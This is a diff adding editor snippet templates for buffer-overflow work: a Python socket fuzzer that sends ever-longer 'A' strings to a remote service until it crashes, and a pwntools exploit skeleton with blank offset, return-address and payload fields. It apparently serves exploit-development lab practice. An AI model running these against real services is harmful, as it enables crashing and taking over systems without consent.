@@ -1,0 +1,56 @@
+snippet boffuzz "remote BOF fuzzer template" b 
+#!/usr/bin/python3
+
+import socket, time
+
+ip = "${1:127.0.0.1}"
+port = ${2:1337}
+timeout = 5
+prefix = b"OVERFLOW1 "
+
+buffer = prefix + b"A" * 100
+
+while True:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            s.connect((ip, port))
+            s.recv(1024)
+            print("Fuzzing with {} bytes".format(len(buffer) - len(prefix)))
+            s.send(buffer)
+            s.recv(1024)
+    except:
+        print("Fuzzing (may have) crashed at {} bytes".format(len(buffer) - len(prefix)))
+        exit()
+    buffer += b"A" * 100
+    time.sleep(1)
+endsnippet
+
+snippet bofexploit "remote BOF exploit template" b 
+#!/usr/bin/python3
+
+from pwn import *
+
+ip = "${1:127.0.0.1}"
+port = ${2:1337}
+timeout = 5
+
+prefix = b"OVERFLOW1 "
+offset = 0
+overflow = b"A" * offset
+retn = b""
+padding = b""
+payload = b""
+postfix = b""
+
+buffer = prefix + overflow + retn + padding + payload + postfix
+
+try:
+    r = remote(ip, port, timeout=timeout)
+    print("Sending evil buffer...")
+    r.recv(1024)
+    r.send(buffer + b"\r\n")
+    print("Done!")
+except:
+    print("Could not connect.")
+endsnippet
